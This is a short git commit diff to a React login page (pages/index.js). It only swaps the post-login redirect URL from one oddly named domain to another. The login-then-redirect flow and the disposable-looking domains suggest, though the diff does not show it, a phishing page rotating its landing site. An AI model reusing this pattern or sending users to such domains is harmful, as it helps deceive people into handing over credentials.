3b13c142bf534e10dd07a4d505caf73feac4429f
husknet <127146284+husknet@users.noreply.github.com>
2025-02-07 10:42:13 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://curtis.1tobyboint.mom/';
+      window.location.href = 'https://cutss.loglinefoline.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
